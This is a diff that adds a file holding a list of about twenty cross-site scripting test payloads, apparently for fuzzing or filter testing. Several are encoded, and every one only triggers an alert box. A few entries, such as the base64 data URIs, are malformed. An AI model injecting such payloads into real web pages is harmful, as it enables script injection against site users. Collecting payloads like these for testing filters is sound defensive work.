@@ -1,0 +1,21 @@
+<script>alert('XSS');</script>
+<iframe src="javascript:alert('XSS');"></iframe>
+&lt;iframe src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/iframe&gt;
+%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2Fiframe%3E
+<img src="x" onerror="alert('XSS');" />
+<a href="javascript:alert('XSS');">Click me</a>
+<svg onload="alert('XSS');"></svg>
+<svg><script>alert('XSS');</script></svg>
+<svg><image href="javascript:alert('XSS');" /></svg>
+<svg><foreignObject><body onload="alert('XSS');"></body></foreignObject></svg>
+<svg><script xlink:href="javascript:alert('XSS');"></script></svg>
+<svg><script src="javascript:alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="javascript:alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="data:text/javascript,alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="data:text/html,alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="data:text/plain,alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="data:text/css,alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="data:text/xml,alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="data:text/javascript;base64,alert('XSS');"></script></svg>
+<svg><script type="text/javascript" src="data:text/javascript;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></script></svg>
+<script>alert(1)</script>
